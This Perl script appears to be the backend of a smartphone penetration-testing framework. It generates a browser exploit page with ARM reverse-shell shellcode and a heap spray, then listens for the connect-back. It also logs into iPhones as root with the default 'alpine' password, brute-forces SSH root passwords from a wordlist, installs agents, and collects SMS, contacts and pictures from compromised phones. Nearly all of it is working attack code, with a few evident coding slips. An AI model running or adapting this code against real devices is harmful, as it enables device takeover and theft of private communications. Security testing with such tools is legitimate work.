#!/usr/bin/perl
use DBI;
use Cwd;
use Expect;
use IO::Socket;
use FindBin qw($Bin);
use lib "$Bin/lib";
use SPF;
my %Variables = SPF::readconfig();
my $dbh = SPF::dbconnect(%Variables);
$Variables{"OS"} = $^O;
$ipaddress = $Variables{"IPADDRESS"};
$webserver = $Variables{"WEBSERVER"};
$path = $ARGV[0];
$key = $ARGV[1];
while(1)
	{
	$fullpath5 = $webserver . $path . "/putfunc";
        open(PUTFILE, "+<$fullpath5");
        $line= <PUTFILE>;
	close(PUTFILE);
	open(PUTFILE2, ">$fullpath5");
	print PUTFILE2;
	close(PUTFILE2);
	@split = split(/ /, $line);
	if (@split[0] eq $key)
	{

		if (@split[1] eq "alpine")
		{
			$vulnerable = "no";
                        $agent = "no";
                        $command = 'sftp';
			$victim = @split[2];
                        $param = "root@" . $victim;
                        $timeout = 10;
                        $passwordstring = $parm . "'s password: ";
                        $putfile = "com.bulbsecurity.tooltest_0.0.1-23_iphoneos-arm.deb";
                        $connectstring = "Connecting to " . $victim . "...";
                        $installcommand = "dpkg -i  com.bulbsecurity.tooltest_0.0.1-23_iphoneos-arm.deb\n";
                        $exp = Expect->spawn($command, $param) or die "Cannot spawm sftp command";
                        $exp->expect($timeout,[$connectstring]);
                        $exp->expect($timeout,["Are you sure you want to continue connecting (yes/no)?", sub {my $self = shift; $self->send("yes\n");}]);
                       	$exp->expect($timeout, $passwordstring);
                        $exp->send("alpine\n");
                        if ($exp->expect($timeout, ["sftp>"]))
                        {
                                $vulnerable="yes";

			} 
			$exp->send("put $putfile\n");
                        $exp->expect($timeout, ["sftp>"]);
                        $exp->send("bye\n");
                        $command2 = "ssh";
                       	$exp = Expect->spawn($command2, $param);
                        $exp->expect($timeout, $passwordstring);
                        $exp->send("alpine\n");
                        $exp->expect($timeout, [qr'root\s*']) ; 
                        $exp->send($installcommand);
                        $exp->expect($timeout, "Setting up com.bulbsecurity.tooltest (0.0.1-23) ...");
                        $exp->send("tooltest\n");
                        if($exp->expect($timeout,["Smartphone Pentest Framework Agent"]))
                        {
                               	 $agent="yes";
                        }
                       	 $exp->send("exit");
                       	 $exp->soft_close();
			 $fullpath2 = $webserver. $path . "/text2.txt";
			 open(GETFILE, ">$fullpath2");
			 print GETFILE "Apline Agent " . $agent;
        		 close(GETFILE);
                        $sql->execute($ipaddress,"alpine",$vulnerable,$agent);



		}
		   elsif(@split[1] eq "guess")
                {
                         $ipaddress = @split[2];
                         $passfile = @split[3];
                         guesscheck($ipaddress,$passfile);

                }

		elsif(@split[1] eq "20101759")
		{
                        $mypath = @split[2];
			$myfile = @split[3];
			$number = @split[4];
			$shellipaddress = $Variables{"SHELLIPADDRESS"};
			$command1 = "mkdir " . $webserver . $mypath;
                        system($command1);
                        $ipaddresscopy = $shellipaddress;
                        @octets = split(/\./, $ipaddresscopy);
                        $out1 = pack "c", @octets[0];
                        $hex1 = unpack "H2" , $out1;
                        $out2 = pack "c", @octets[1];
                        $hex2 = unpack "H2" , $out2;
                        $out3 = pack "c", @octets[2];
                        $hex3 = unpack "H2" , $out3;
                        $out4 = pack "c", @octets[3];
                        $hex4 = unpack "H2" , $out4;
                        $sploitfile = $webserver . $mypath . $myfile;
                        $command8 = "touch " . $sploitfile;
                        system($command8);
                        $command9 = "chmod 777 " . $sploitfile;
                        system($command9);
 			open(SPLOITFILE, ">$sploitfile");
                        print SPLOITFILE "<html>\n";
			print SPLOITFILE "<head>\n";
			print SPLOITFILE "<script>\n"; 
			print SPLOITFILE "var ip = unescape(\"\\u" . $hex2 . $hex1 . "\\u" . $hex4 . $hex3 . "\");\n";
			print SPLOITFILE "var port = unescape(\"\\u3930\");\n";
			print SPLOITFILE "function trigger()\n";
			print SPLOITFILE "{\n";
			print SPLOITFILE "var span = document.createElement(\"div\");\n";
			print SPLOITFILE "document.getElementById(\"BodyID\").appendChild(span);\n";
			print SPLOITFILE "span.innerHTML = -parseFloat(\"NAN(ffffe00572c60)\");\n"; 
			print SPLOITFILE "}\n";
			print SPLOITFILE "function exploit()\n";
			print SPLOITFILE "{\n";   
			print SPLOITFILE "var nop = unescape(\"\\u33bc\\u0057\");\n";
			print SPLOITFILE "do\n";
			print SPLOITFILE "{\n";
			print SPLOITFILE "nop+=nop;\n";
			print SPLOITFILE "} while (nop.length<=0x1000);\n";
			print SPLOITFILE "var scode = nop+unescape(\"\\u1001\\ue1a0\\u0002\\ue3a0\\u1001\\ue3a0\\u2005\\ue281\\u708c\\ue3a0\\u708d\\ue287\\u0080\\uef00\\u6000\\ue1a0\\u1084\\ue28f\\u2010\\ue3a0\\u708d\\ue3a0\\u708e\\ue287\\u0080\\uef00\\u0006\\ue1a0\\u1000\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u0006\\ue1a0\\u1001\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u0006\\ue1a0\\u1002\\ue3a0\\u703f\\ue3a0\\u0080\\uef00\\u2001\\ue28f\\uff12\\ue12f\\u4040\\u2717\\udf80\\ua005\\ua508\\u4076\\u602e\\u1b6d\\ub420\\ub401\\u4669\\u4052\\u270b\\udf80\\u2f2f\\u732f\\u7379\\u6574\\u2f6d\\u6962\\u2f6e\\u6873\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u2000\\u0002\");\n";
			print SPLOITFILE "scode += port;\n";
			print SPLOITFILE "scode += ip;\n";
			print SPLOITFILE "scode += unescape(\"\\u2000\\u2000\");\n";
			print SPLOITFILE "target = new Array();\n";
			print SPLOITFILE "for(i = 0; i < 0x1000; i++)\n";
			print SPLOITFILE "target[i] = scode;\n";
			print SPLOITFILE "for (i = 0; i <= 0x1000; i++)\n";
			print SPLOITFILE "{\n";
			print SPLOITFILE "document.write(target[i]+\"<i>\");\n";
			print SPLOITFILE "if (i>0x999)\n";
			print SPLOITFILE "{\n";
			print SPLOITFILE "trigger();\n";
			print SPLOITFILE "}\n";
			print SPLOITFILE "}\n";
			print SPLOITFILE "}\n";
			print SPLOITFILE "</script>\n";
			print SPLOITFILE "</head>\n";
			print SPLOITFILE "<body id=\"BodyID\">\n";
			print SPLOITFILE "Enjoy!\n";
			print SPLOITFILE "<script>\n";
			print SPLOITFILE "exploit();\n";
			print SPLOITFILE "</script>\n";
			print SPLOITFILE "</body>\n";
			print SPLOITFILE "</html>\n";
			close(SPLOITFILE);
			$vulnerable = "no";
                        $socket = new IO::Socket::INET (LocalHost => $shellipaddress, LocalPort => '12345', Proto => 'tcp' , Listen => 1, Reuse => 1);
                        if ($data_socket = $socket->accept())
                        {
                               	$data="/system/bin/id\n";
                                print $data_socket $data;
                                $data=<$data_socket>;
                                close($data_socket);
                                $vulnerable = "yes";
 				$fullpath2 = $webserver. $path . "/text2.txt";
                                open(GETFILE, ">$fullpath2");
                                print GETFILE $vulnerable;
                                close(GETFILE);
                         }
			$sql = $dbh->prepare("INSERT INTO client (id,number,exploit,vuln) VALUES (DEFAULT,?,?,?)");
			$sql->execute($number,"webkit",$vulnerable);
			
		}

		elsif (@split[1] eq "ANDROID")
		{
                        $mypath = @split[2];
                        $myfile = @split[3];
                        $command1 = "mkdir " . $webserver . $mypath;
                        system($command1);
			$androidagent = $Variables{"ANDROIDAGENT"};
                        $command = "cp " . $androidagent . " " .  $webserver . $mypath . $myfile;
                        system($command);
			
		}
		elsif (@split[1] eq "IPHONE")
		{

		}
		elsif (@split[1] eq "BLACKBERRY")
		{

		}
		elsif (@split[1] eq "AGENTS")
		{
                	$sql = $dbh->prepare("SELECT COUNT(*) from agents");
                	$results = $sql->execute;
                	@rows = $sql->fetchrow_array();
                	$row = @rows[0];

			$fullpath2 = $webserver . $path . "/text2.txt";
			open(CLEARFILE2, ">$fullpath2");
       			print CLEARFILE2;
        		close(CLEARFILE2);
			open(GETFILE, ">$fullpath2");
			if ($row == 0)
			{
				print GETFILE $key . " NONE\n";
				close(GETFILE);
			}
			else 
			{
				print GETFILE $key . " AGEN\n";	
               		 	for($i=1; $i<=$row; $i++)
                		{
                        		$sql = $dbh->prepare("SELECT number from agents where id=?");
                        		$results = $sql->execute($i);
                        		@rows = $sql->fetchrow_array();
                        		$r = @rows[0];

                        		$sql = $dbh->prepare("SELECT controlkey from agents where id=?");
                        		$results = $sql->execute($i);
                        		@rows2 = $sql->fetchrow_array();
                        		$q = @rows2[0];

                        		$agentlistitem = $i . ".) " . $r . " " . $q . "\n";
					print GETFILE $agentlistitem;

		                }
				close(GETFILE);
			}
		}
		elsif (@split[1] eq "ROOT")
		{
			$i = @split[2];
                        $sql = $dbh->prepare("SELECT path from agents where id=?");
                        $results = $sql->execute($i);
                        @rows = $sql->fetchrow_array();
                        $path1 = @rows[0];
			sleep 60;
			$text = $webserver . $path1 . "/text.txt";
                        open(TEXTFILE, "+<$text");
                        $line= <TEXTFILE>;
			if ($line eq "Root Succeeded")
			{
				$sql = $dbh->prepare("UPDATE data SET root=? WHERE id=?");
				$sql->execute($yes,$i);
			}
                                close(TEXTFILE);
                                open(TEXTFILE2, ">$text");
                                print TEXTFILE2 "";
                                close(TEXTFILE2);
		}

		elsif (@split[1] eq "PICT")
		{
			$i = @split[2];
                        $sql = $dbh->prepare("SELECT path from agents where id=?");
                        $results = $sql->execute($i);
                        @rows = $sql->fetchrow_array();
                        $path1 = @rows[0];
			sleep 5;
			$picturefile = $webserver . $path1 . "/picture.jpg";
                        open(PICTURE, "+<$picturefile");
			if (!(-z PICTURE))
			{
				$command = "cp" . " " . $picturefile . " " . ".";				
				system($command);
				$picturedir = getcwd();
				$picture = $picturedir . "/" . "picture.jpg";
				$sql = $dbh->prepare("UPDATE data SET picture=? WHERE id=?");
				$sql->execute($picture,$i);
				close(PICTURE);
                                open(PICTURE2, ">$picturefile");
                                print PICTURE2 "";
                                close(PICTURE2);
			}
		}
		elsif (@split[1] eq "SMSS")
		{
			$i = @split[2];
			sleep 5;
			$text = $webserver . $path . "/text.txt";
                        open(TEXTFILE, "+<$text");
                        $line= <TEXTFILE>;
                        $sql = $dbh->prepare("UPDATE data SET sms=? WHERE id=?");
                        $sql->execute($line,$i);
                        close(TEXTFILE);
                        open(TEXTFILE2, ">$text");
                        print TEXTFILE2 "";
                        close(TEXTFILE2);
		}
		elsif (@split[1] eq "CONT")
		{
			$i = @split[2];
			sleep 5;
			$text = $webserver . $path . "/text.txt";
                        open(TEXTFILE, "+<$text");
                        $line= <TEXTFILE>;
                        $sql = $dbh->prepare("UPDATE data SET contacts=? WHERE id=?");
                        $sql->execute($line,$i);
                        close(TEXTFILE);
                        open(TEXTFILE2, ">$text");
                        print TEXTFILE2 "";
                        close(TEXTFILE2);

		}
		 elsif (@split[1] eq "DATA")
                {
                        $id = @split[2];
        		$sql = $dbh->prepare("SELECT sms from data where id=?");
        		$sms = $sql->execute($id);
         		@rows = $sql->fetchrow_array();
        		$smsrow= @rows[0];

        		$sql = $dbh->prepare("SELECT contacts from data where id=?");
        		$contacts = $sql->execute($id);
        		@rows = $sql->fetchrow_array();
        		$contactsrow = @rows[0];

        		$sql = $dbh->prepare("SELECT picture from data where id=?");
        		$picture = $sql->execute($id);
        		@rows = $sql->fetchrow_array();
        		$picturerow = @rows[0];

        		$sql = $dbh->prepare("SELECT root from data where id=?");
        		$root = $sql->execute($id);
         		@rows = $sql->fetchrow_array();
         		$rootrow = @rows[0];

			$fullpath2 = $webserver . $path . "/text2.txt";
                        open(CLEARFILE2, ">$fullpath2");
                        print CLEARFILE2;
                        close(CLEARFILE2);
                        open(GETFILE, ">$fullpath2");
 		       print GETFILE "SMS Database: " . $smsrow . "\n";
        		print GETFILE "Contacts: " . $contactsrow . "\n";
        		print GETFILE "Picture Location: " . $picturerow . "\n";
        		print GETFILE "Rooted?: " . $rootrow . "\n";
			close(GETFILE);


		}
		
	}
}

sub guesscheck
{
	 $ipaddress = $_[0];
         $passfile = $_[1];
         $vulnerable = "no";
         $agent = "no";
         $command = 'sftp';
         $param = "root@" . $ipaddress;
         $timeout = 10;
         $notfound = "ssh: connect to host " . $ipaddress . " port 22: Connection refused";
         $passwordstring = $parm . "'s password: ";
         $location = $Variables{"IPHONEAGENT"};
         $putfile = $location;
         $connectstring = "Connecting to " . $ipaddress . "...";
         $installcommand = "dpkg -i " . "iphone.deb" . "\n";
         $guesspassword = "null";
         open(READFILE, "<",$passfile) or die "Couldn't open $passfile for reading! ($!)";
         while(<READFILE>)
         {
                 $guess = $_;
                 $guess2 = $guess . "\n";
                 $exp = Expect->spawn($command, $param) or die "Cannot spawm sftp command";
                 $exp->expect($timeout,[$connectstring]);
                 $exp->expect($timeout,["Are you sure you want to continue connecting (yes/no)?", sub {my $self = shift; $self->send("yes\n");}]); #[$notfound, return]);
                 $exp->expect($timeout, $passwordstring);
                 $exp->send($guess2);
                 if ($exp->expect($timeout, ["sftp>"]))
                 {
                        $vulnerable="yes";
                        $guesspassword = $guess;
                        $exp->send("put $putfile\n");
                        $exp->expect($timeout, ["sftp>"]);
                        $exp->send("bye\n");
                        $command2 = "ssh";
                        $exp = Expect->spawn($command2, $param);
                        $exp->expect($timeout, $passwordstring);
                        $exp->send($guess2);
                        $exp->expect($timeout, [qr'root\s*']);
                        $exp->send($installcommand);
                        $exp->expect($timeout, "Setting up com.bulbsecurity.tooltest (0.0.1-23) ...");
                        $exp->send("tooltest\n");
                        if($exp->expect($timeout,["Smartphone Pentest Framework Agent"]))
			{
                                   $agent="yes";
                        }
                  	 $exp->send("exit");
   			 $exp->soft_close();
                        last;
                }
        }
	 close READFILE;
         $guessstring = "Guess: " . $guesspassword;
                        $sql = $dbh->prepare("INSERT INTO remote (id,ip,exploit,vuln,agent) VALUES (DEFAULT,?,?,?,?)");
                        $sql->execute($ipaddress,$guessstring,$vulnerable,$agent);

}

